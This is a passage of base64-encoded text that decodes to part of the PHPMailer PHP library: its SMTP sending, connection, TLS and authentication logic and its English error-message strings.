vQXJyIGFzICR0b0FkZHIpIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0b0FkZHIsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCBhcnJheSgkdG9BZGRyKSwgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0bywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJHJlc3VsdCwgJHRoaXMtPnRvLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOwogICAgICAgIH0KICAgICAgICBpZiAoaXNzZXQoJG9sZF9mcm9tKSkgewogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJG9sZF9mcm9tKTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkcmVzdWx0KSB7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2luc3RhbnRpYXRlJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCBhbiBpbnN0YW5jZSB0byB1c2UgZm9yIFNNVFAgb3BlcmF0aW9ucy4KICAgICAqIE92ZXJyaWRlIHRoaXMgZnVuY3Rpb24gdG8gbG9hZCB5b3VyIG93biBTTVRQIGltcGxlbWVudGF0aW9uCiAgICAgKiBAcmV0dXJuIFNNVFAKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFNNVFBJbnN0YW5jZSgpCiAgICB7CiAgICAgICAgaWYgKCFpc19vYmplY3QoJHRoaXMtPnNtdHApKSB7CiAgICAgICAgICAgICR0aGlzLT5zbXRwID0gbmV3IFNNVFA7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+c210cDsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWFpbCB2aWEgU01UUC4KICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlcmUgaXMgYSBiYWQgTUFJTCBGUk9NLCBSQ1BULCBvciBEQVRBIGlucHV0LgogICAgICogVXNlcyB0aGUgUEhQTWFpbGVyU01UUCBjbGFzcyBieSBkZWZhdWx0LgogICAgICogQHNlZSBQSFBNYWlsZXI6OmdldFNNVFBJbnN0YW5jZSgpIHRvIHVzZSBhIGRpZmZlcmVudCBjbGFzcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBUaGUgbWVzc2FnZSBoZWFkZXJzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IFRoZSBtZXNzYWdlIGJvZHkKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAdXNlcyBTTVRQCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzbXRwU2VuZCgkaGVhZGVyLCAkYm9keSkKICAgIHsKICAgICAgICAkYmFkX3JjcHQgPSBhcnJheSgpOwogICAgICAgIGlmICghJHRoaXMtPnNtdHBDb25uZWN0KCR0aGlzLT5TTVRQT3B0aW9ucykpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc210cF9jb25uZWN0X2ZhaWxlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPkZyb207CiAgICAgICAgfQogICAgICAgIGlmICghJHRoaXMtPnNtdHAtPm1haWwoJHNtdHBfZnJvbSkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdmcm9tX2ZhaWxlZCcpIC4gJHNtdHBfZnJvbSAuICcgOiAnIC4gaW1wbG9kZSgnLCcsICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpKSk7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPkVycm9ySW5mbywgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQoKICAgICAgICAvLyBBdHRlbXB0IHRvIHNlbmQgdG8gYWxsIHJlY2lwaWVudHMKICAgICAgICBmb3JlYWNoIChhcnJheSgkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYykgYXMgJHRvZ3JvdXApIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRvZ3JvdXAgYXMgJHRvKSB7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5yZWNpcGllbnQoJHRvWzBdKSkgewogICAgICAgICAgICAgICAgICAgICRlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOwogICAgICAgICAgICAgICAgICAgICRiYWRfcmNwdFtdID0gYXJyYXkoJ3RvJyA9PiAkdG9bMF0sICdlcnJvcicgPT4gJGVycm9yWydkZXRhaWwnXSk7CiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCA9IGZhbHNlOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkaXNTZW50ID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRpc1NlbnQsIGFycmF5KCR0b1swXSksIGFycmF5KCksIGFycmF5KCksICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyBPbmx5IHNlbmQgdGhlIERBVEEgY29tbWFuZCBpZiB3ZSBoYXZlIHZpYWJsZSByZWNpcGllbnRzCiAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+YWxsX3JlY2lwaWVudHMpID4gY291bnQoJGJhZF9yY3B0KSkgYW5kICEkdGhpcy0+c210cC0+ZGF0YSgkaGVhZGVyIC4gJGJvZHkpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2RhdGFfbm90X2FjY2VwdGVkJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPlNNVFBLZWVwQWxpdmUpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnJlc2V0KCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIC8vQ3JlYXRlIGVycm9yIG1lc3NhZ2UgZm9yIGFueSBiYWQgYWRkcmVzc2VzCiAgICAgICAgaWYgKGNvdW50KCRiYWRfcmNwdCkgPiAwKSB7CiAgICAgICAgICAgICRlcnJzdHIgPSAnJzsKICAgICAgICAgICAgZm9yZWFjaCAoJGJhZF9yY3B0IGFzICRiYWQpIHsKICAgICAgICAgICAgICAgICRlcnJzdHIgLj0gJGJhZFsndG8nXSAuICc6ICcgLiAkYmFkWydlcnJvciddOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygncmVjaXBpZW50c19mYWlsZWQnKSAuICRlcnJzdHIsCiAgICAgICAgICAgICAgICBzZWxmOjpTVE9QX0NPTlRJTlVFCiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogSW5pdGlhdGUgYSBjb25uZWN0aW9uIHRvIGFuIFNNVFAgc2VydmVyLgogICAgICogUmV0dXJucyBmYWxzZSBpZiB0aGUgb3BlcmF0aW9uIGZhaWxlZC4KICAgICAqIEBwYXJhbSBhcnJheSAkb3B0aW9ucyBBbiBhcnJheSBvZiBvcHRpb25zIGNvbXBhdGlibGUgd2l0aCBzdHJlYW1fY29udGV4dF9jcmVhdGUoKQogICAgICogQHVzZXMgU01UUAogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDb25uZWN0KCRvcHRpb25zID0gbnVsbCkKICAgIHsKICAgICAgICBpZiAoaXNfbnVsbCgkdGhpcy0+c210cCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAgPSAkdGhpcy0+Z2V0U01UUEluc3RhbmNlKCk7CiAgICAgICAgfQoKICAgICAgICAvL0lmIG5vIG9wdGlvbnMgYXJlIHByb3ZpZGVkLCB1c2Ugd2hhdGV2ZXIgaXMgc2V0IGluIHRoZSBpbnN0YW5jZQogICAgICAgIGlmIChpc19udWxsKCRvcHRpb25zKSkgewogICAgICAgICAgICAkb3B0aW9ucyA9ICR0aGlzLT5TTVRQT3B0aW9uczsKICAgICAgICB9CgogICAgICAgIC8vIEFscmVhZHkgY29ubmVjdGVkPwogICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+c210cC0+c2V0VGltZW91dCgkdGhpcy0+VGltZW91dCk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnTGV2ZWwoJHRoaXMtPlNNVFBEZWJ1Zyk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnT3V0cHV0KCR0aGlzLT5EZWJ1Z291dHB1dCk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFZlcnAoJHRoaXMtPmRvX3ZlcnApOwogICAgICAgICRob3N0cyA9IGV4cGxvZGUoJzsnLCAkdGhpcy0+SG9zdCk7CiAgICAgICAgJGxhc3RleGNlcHRpb24gPSBudWxsOwoKICAgICAgICBmb3JlYWNoICgkaG9zdHMgYXMgJGhvc3RlbnRyeSkgewogICAgICAgICAgICAkaG9zdGluZm8gPSBhcnJheSgpOwogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAnL14oKHNzbHx0bHMpOlwvXC8pKihbYS16QS1aMC05XC4tXSp8XFtbYS1mQS1GMC05Ol0rXF0pOj8oWzAtOV0qKSQvJywKICAgICAgICAgICAgICAgIHRyaW0oJGhvc3RlbnRyeSksCiAgICAgICAgICAgICAgICAkaG9zdGluZm8KICAgICAgICAgICAgKSkgewogICAgICAgICAgICAgICAgLy8gTm90IGEgdmFsaWQgaG9zdCBlbnRyeQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnSWdub3JpbmcgaW52YWxpZCBob3N0OiAnIC4gJGhvc3RlbnRyeSk7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyAkaG9zdGluZm9bMl06IG9wdGlvbmFsIHNzbCBvciB0bHMgcHJlZml4CiAgICAgICAgICAgIC8vICRob3N0aW5mb1szXTogdGhlIGhvc3RuYW1lCiAgICAgICAgICAgIC8vICRob3N0aW5mb1s0XTogb3B0aW9uYWwgcG9ydCBudW1iZXIKICAgICAgICAgICAgLy8gVGhlIGhvc3Qgc3RyaW5nIHByZWZpeCBjYW4gdGVtcG9yYXJpbHkgb3ZlcnJpZGUgdGhlIGN1cnJlbnQgc2V0dGluZyBmb3IgU01UUFNlY3VyZQogICAgICAgICAgICAvLyBJZiBpdCdzIG5vdCBzcGVjaWZpZWQsIHRoZSBkZWZhdWx0IHZhbHVlIGlzIHVzZWQKICAgICAgICAgICAgJHByZWZpeCA9ICcnOwogICAgICAgICAgICAkc2VjdXJlID0gJHRoaXMtPlNNVFBTZWN1cmU7CiAgICAgICAgICAgICR0bHMgPSAoJHRoaXMtPlNNVFBTZWN1cmUgPT0gJ3RscycpOwogICAgICAgICAgICBpZiAoJ3NzbCcgPT0gJGhvc3RpbmZvWzJdIG9yICgnJyA9PSAkaG9zdGluZm9bMl0gYW5kICdzc2wnID09ICR0aGlzLT5TTVRQU2VjdXJlKSkgewogICAgICAgICAgICAgICAgJHByZWZpeCA9ICdzc2w6Ly8nOwogICAgICAgICAgICAgICAgJHRscyA9IGZhbHNlOyAvLyBDYW4ndCBoYXZlIFNTTCBhbmQgVExTIGF0IHRoZSBzYW1lIHRpbWUKICAgICAgICAgICAgICAgICRzZWN1cmUgPSAnc3NsJzsKICAgICAgICAgICAgfSBlbHNlaWYgKCRob3N0aW5mb1syXSA9PSAndGxzJykgewogICAgICAgICAgICAgICAgJHRscyA9IHRydWU7CiAgICAgICAgICAgICAgICAvLyB0bHMgZG9lc24ndCB1c2UgYSBwcmVmaXgKICAgICAgICAgICAgICAgICRzZWN1cmUgPSAndGxzJzsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0RvIHdlIG5lZWQgdGhlIE9wZW5TU0wgZXh0ZW5zaW9uPwogICAgICAgICAgICAkc3NsZXh0ID0gZGVmaW5lZCgnT1BFTlNTTF9BTEdPX1NIQTEnKTsKICAgICAgICAgICAgaWYgKCd0bHMnID09PSAkc2VjdXJlIG9yICdzc2wnID09PSAkc2VjdXJlKSB7CiAgICAgICAgICAgICAgICAvL0NoZWNrIGZvciBhbiBPcGVuU1NMIGNvbnN0YW50IHJhdGhlciB0aGFuIHVzaW5nIGV4dGVuc2lvbl9sb2FkZWQsIHdoaWNoIGlzIHNvbWV0aW1lcyBkaXNhYmxlZAogICAgICAgICAgICAgICAgaWYgKCEkc3NsZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKS4nb3BlbnNzbCcsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRob3N0ID0gJGhvc3RpbmZvWzNdOwogICAgICAgICAgICAkcG9ydCA9ICR0aGlzLT5Qb3J0OwogICAgICAgICAgICAkdHBvcnQgPSAoaW50ZWdlcikkaG9zdGluZm9bNF07CiAgICAgICAgICAgIGlmICgkdHBvcnQgPiAwIGFuZCAkdHBvcnQgPCA2NTUzNikgewogICAgICAgICAgICAgICAgJHBvcnQgPSAkdHBvcnQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0KCRwcmVmaXggLiAkaG9zdCwgJHBvcnQsICR0aGlzLT5UaW1lb3V0LCAkb3B0aW9ucykpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5IZWxvKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5IZWxvOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+aGVsbG8oJGhlbGxvKTsKICAgICAgICAgICAgICAgICAgICAvL0F1dG9tYXRpY2FsbHkgZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGlmOgogICAgICAgICAgICAgICAgICAgIC8vICogaXQncyBub3QgZGlzYWJsZWQKICAgICAgICAgICAgICAgICAgICAvLyAqIHdlIGhhdmUgb3BlbnNzbCBleHRlbnNpb24KICAgICAgICAgICAgICAgICAgICAvLyAqIHdlIGFyZSBub3QgYWxyZWFkeSB1c2luZyBTU0wKICAgICAgICAgICAgICAgICAgICAvLyAqIHRoZSBzZXJ2ZXIgb2ZmZXJzIFNUQVJUVExTCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TTVRQQXV0b1RMUyBhbmQgJHNzbGV4dCBhbmQgJHNlY3VyZSAhPSAnc3NsJyBhbmQgJHRoaXMtPnNtdHAtPmdldFNlcnZlckV4dCgnU1RBUlRUTFMnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0bHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+c3RhcnRUTFMoKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnY29ubmVjdF9ob3N0JykpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFdlIG11c3QgcmVzZW5kIEVITE8gYWZ0ZXIgVExTIG5lZ290aWF0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPmF1dGhlbnRpY2F0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5Vc2VybmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5QYXNzd29yZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5BdXRoVHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5SZWFsbSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5Xb3Jrc3RhdGlvbgogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnYXV0aGVudGljYXRlJykpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9ICRleGM7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgICAgIC8vIFdlIG11c3QgaGF2ZSBjb25uZWN0ZWQsIGJ1dCB0aGVuIGZhaWxlZCBUTFMgb3IgQXV0aCwgc28gY2xvc2UgY29ubmVjdGlvbiBuaWNlbHkKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vIElmIHdlIGdldCBoZXJlLCBhbGwgY29ubmVjdGlvbiBhdHRlbXB0cyBoYXZlIGZhaWxlZCwgc28gY2xvc2UgY29ubmVjdGlvbiBoYXJkCiAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgLy8gQXMgd2UndmUgY2F1Z2h0IGFsbCBleGNlcHRpb25zLCBqdXN0IHJlcG9ydCB3aGF0ZXZlciB0aGUgbGFzdCBvbmUgd2FzCiAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zIGFuZCAhaXNfbnVsbCgkbGFzdGV4Y2VwdGlvbikpIHsKICAgICAgICAgICAgdGhyb3cgJGxhc3RleGNlcHRpb247CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENsb3NlIHRoZSBhY3RpdmUgU01UUCBzZXNzaW9uIGlmIG9uZSBleGlzdHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDbG9zZSgpCiAgICB7CiAgICAgICAgaWYgKGlzX2EoJHRoaXMtPnNtdHAsICdTTVRQJykpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBsYW5ndWFnZSBmb3IgZXJyb3IgbWVzc2FnZXMuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIGl0IGNhbm5vdCBsb2FkIHRoZSBsYW5ndWFnZSBmaWxlLgogICAgICogVGhlIGRlZmF1bHQgbGFuZ3VhZ2UgaXMgRW5nbGlzaC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGxhbmdjb2RlIElTTyA2MzktMSAyLWNoYXJhY3RlciBsYW5ndWFnZSBjb2RlIChlLmcuIEZyZW5jaCBpcyAiZnIiKQogICAgICogQHBhcmFtIHN0cmluZyAkbGFuZ19wYXRoIFBhdGggdG8gdGhlIGxhbmd1YWdlIGZpbGUgZGlyZWN0b3J5LCB3aXRoIHRyYWlsaW5nIHNlcGFyYXRvciAoc2xhc2gpCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRMYW5ndWFnZSgkbGFuZ2NvZGUgPSAnZW4nLCAkbGFuZ19wYXRoID0gJycpCiAgICB7CiAgICAgICAgLy8gQmFja3dhcmRzIGNvbXBhdGliaWxpdHkgZm9yIHJlbmFtZWQgbGFuZ3VhZ2UgY29kZXMKICAgICAgICAkcmVuYW1lZF9sYW5nY29kZXMgPSBhcnJheSgKICAgICAgICAgICAgJ2JyJyA9PiAncHRfYnInLAogICAgICAgICAgICAnY3onID0+ICdjcycsCiAgICAgICAgICAgICdkaycgPT4gJ2RhJywKICAgICAgICAgICAgJ25vJyA9PiAnbmInLAogICAgICAgICAgICAnc2UnID0+ICdzdicsCiAgICAgICAgICAgICdzcicgPT4gJ3JzJwogICAgICAgICk7CgogICAgICAgIGlmIChpc3NldCgkcmVuYW1lZF9sYW5nY29kZXNbJGxhbmdjb2RlXSkpIHsKICAgICAgICAgICAgJGxhbmdjb2RlID0gJHJlbmFtZWRfbGFuZ2NvZGVzWyRsYW5nY29kZV07CiAgICAgICAgfQoKICAgICAgICAvLyBEZWZpbmUgZnVsbCBzZXQgb2YgdHJhbnNsYXRhYmxlIHN0cmluZ3MgaW4gRW5nbGlzaAogICAgICAgICRQSFBNQUlMRVJfTEFORyA9IGFycmF5KAogICAgICAgICAgICAnYXV0aGVudGljYXRlJyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGF1dGhlbnRpY2F0ZS4nLAogICAgICAgICAgICAnY29ubmVjdF9ob3N0JyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGNvbm5lY3QgdG8gU01UUCBob3N0LicsCiAgICAgICAgICAgICdkYXRhX25vdF9hY2NlcHRlZCcgPT4gJ1NNVFAgRXJyb3I6IGRhdGEgbm90IGFjY2VwdGVkLicsCiAgICAgICAgICAgICdlbXB0eV9tZXNzYWdlJyA9PiAnTWVzc2FnZSBib2R5IGVtcHR5JywKICAgICAgICAgICAgJ2VuY29kaW5nJyA9PiAnVW5rbm93biBlbmNvZGluZzogJywKICAgICAgICAgICAgJ2V4ZWN1dGUnID0+ICdDb3VsZCBub3QgZXhlY3V0ZTogJywKICAgICAgICAgICAgJ2ZpbGVfYWNjZXNzJyA9PiAnQ291bGQgbm90IGFjY2VzcyBmaWxlOiAnLAogICAgICAgICAgICAnZmlsZV9vcGVuJyA9PiAnRmlsZSBFcnJvcjogQ291bGQgbm90IG9wZW4gZmlsZTogJywKICAgICAgICAgICAgJ2Zyb21fZmFpbGVkJyA9PiAnVGhlIGZvbGxvd2luZyBGcm9tIGFkZHJlc3MgZmFpbGVkOiAnLAogICAgICAgICAgICAnaW5zdGFudGlhdGUnID0+ICdDb3VsZCBub3QgaW5zdGFudGlhdGUgbWFpbCBmdW5jdGlvbi4nLAogICAgICAgICAgICAnaW52YWxpZF9hZGRyZXNzJyA9PiAnSW52YWxpZCBhZGRyZXNzOiAnLAogICAgICAgICAgICAnbWFpbGVyX25vdF9zdXBwb3J0ZWQnID0+ICcgbWFpbGVyIGlzIG5vdCBzdXBwb3J0ZWQuJywKICAgICAgICAgICAgJ3Byb3ZpZGVfYWRkcmVzcycgPT4gJ1lvdSBtdXN0IHByb3ZpZGUgYXQgbGVhc3Qgb25lIHJlY2lwaWVudCBlbWFpbCBhZGRyZXNzLicsCiAgICAgICAgICAgICdyZWNpcGllbnRzX2ZhaWxlZCcgPT4gJ1NNVFAgRXJyb3I6IFRoZSBmb2xsb3dpbmcgcmVjaXBpZW50cyBmYWlsZWQ6ICcsCiAgICAgICAgICAgICdzaWduaW5nJyA9PiAnU2lnbmluZyBFcnJvcjogJywKICAgICAgICAgICAgJ3NtdHBfY29ubmVjdF9mYWlsZWQnID0+ICdTTVRQIGNvbm5lY3QoKSBmYWlsZWQuJywKICAgICAgICAgICAgJ3NtdHBfZXJyb3InID0+ICdTTVRQIHNlcnZlciBlcnJvcjogJywKICAgICAgICAgICAgJ3ZhcmlhYmxlX3NldCcgPT4gJ0Nhbm5vdCBzZXQgb3IgcmVzZXQgdmFyaWFibGU6ICcsCiAgICAgICAgICAgICdleHRlbnNpb25fbWlzc2luZycgPT4gJ0V4dGVuc2lvbiBtaXNzaW5nOiAnCiAgICAgICAgKTsKICAgICAgICBpZiAoZW1wdHkoJGxhbmdfcGF0aCkpIHsKICAgICAgICAgICAgLy8gQ2FsY3VsYXRlIGFuIGFic29sdXRlIHBhdGggc28gaXQgY2FuIHdvcmsgaWYgQ1dEIGlzIG5vdCBoZXJlCiAgICAgICAgICAgICRsYW5nX3BhdGggPSBkaXJuYW1lKF9fRklMRV9fKS4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdsYW5ndWFnZScuIERJUkVDVE9SWV9TRVBBUkFUT1I7CiAgICAgICAgfQogICAgICAgIC8vVmFsaWRhdGUgJGxhbmdjb2RlCiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvXlthLXpdezJ9KD86X1thLXpBLVpdezJ9KT8kLycsICRsYW5nY29kZSkpIHsKICAgICAgICAgICAgJGxhbmdjb2RlID0gJ2VuJzsKICAgICAgICB9CiAgICAgICAgJGZvdW5kbGFuZyA9IHRydWU7CiAgICAgICAgJGxhbmdfZmlsZSA9ICRsYW5nX3BhdGggLiAncGhwbWFpbGVyLmxhbmctJyAuICRsYW5nY29kZSAuICcucGhwJzsKICAgICAgICAvLyBUaGVyZSBpcyBubyBFbmdsaXNoIHRyYW5zbGF0aW9uIGZpbGUKICAgICAgICBpZiAoJGxhbmdjb2RlICE9ICdlbicpIHsKICAgICAgICAgICAgLy8gTWFrZSBzdXJlIGxhbmd1YWdlIGZpbGUgcGF0aCBpcyByZWFkYWJsZQogICAgICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkbGFuZ19maWxlKSBvciAhaXNfcmVhZGFibGUoJGxhbmdfZmlsZSkpIHsKICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBmYWxzZTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIE92ZXJ3cml0ZSBsYW5ndWFnZS1zcGVjaWZpYyBzdHJpbmdzLgogICAgICAgICAgICAgICAgLy8gVGhpcyB3YXkgd2UnbGwgbmV2ZXIgaGF2ZSBtaXNzaW5nIHRyYW5zbGF0aW9uIGtleXMuCiAgICAgICAgICAgICAgICAkZm91bmRsYW5nID0gaW5jbHVkZSAkbGFuZ19maWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5sYW5ndWFnZSA9ICRQSFBNQUlMRVJfTEFORzsKICAgICAgICByZXR1cm4gKGJvb2xlYW4pJGZvdW5kbGFuZzsgLy8gUmV0dXJucyBmYWxzZSBpZiBsYW5ndWFnZSBub3QgZm91bmQKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgYXJyYXkgb2Ygc3RyaW5ncyBmb3IgdGhlIGN